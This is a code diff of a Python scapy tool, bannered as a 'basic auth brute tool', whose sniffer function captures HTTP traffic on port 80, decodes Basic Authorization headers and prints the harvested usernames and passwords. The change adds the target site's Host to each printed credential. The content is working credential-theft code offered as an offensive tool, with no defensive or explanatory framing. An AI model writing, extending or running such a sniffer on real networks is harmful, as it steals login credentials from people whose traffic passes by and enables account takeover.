@@ -10,7 +10,7 @@ except ImportError:
 try:
     from scapy.all import *
 except ImportError:
-    print('error - please have the module "scapy-python3" installed.')
+    print('error - please have the module "scapy" installed.')
     sys.exit(1)
 try:
     from scapy.layers import http
@@ -38,7 +38,7 @@ def header():
     |___|__,|_|___|_  |
                   |___|{}
    basic auth brute tool
-  by ryland192000 // v1.1 {}   
+  by ryland192000 // v1.0 {}   
   
 """.format(txt.y,txt.b,txt.e))
 
@@ -94,16 +94,18 @@ def sniffer():
 			req = p.getlayer('HTTP Request')
 			if req:
 				auth = req.Authorization
-				if auth and auth.startswith(b'Basic' ):
+				host = req.Host
+				if auth and host and auth.startswith(b'Basic' ):
 					username, password = base64_bytes(auth.split(None, 1)[1]).split(b':', 1)
 					print('''{}
 Credentials Found!
 
+{}Site: {}{}{}
 [ Username ]
 > {}
 [ Password ]
 > {} {}
-'''.format(txt.b,username.decode(),password.decode(),txt.e))
+'''.format(txt.b,txt.u,host.decode(),txt.e,txt.b,username.decode(),password.decode(),txt.e))
 	try:
 		sniff(iface=interface,store=0,filter="tcp and port 80",prn=packet)
 	except KeyboardInterrupt:
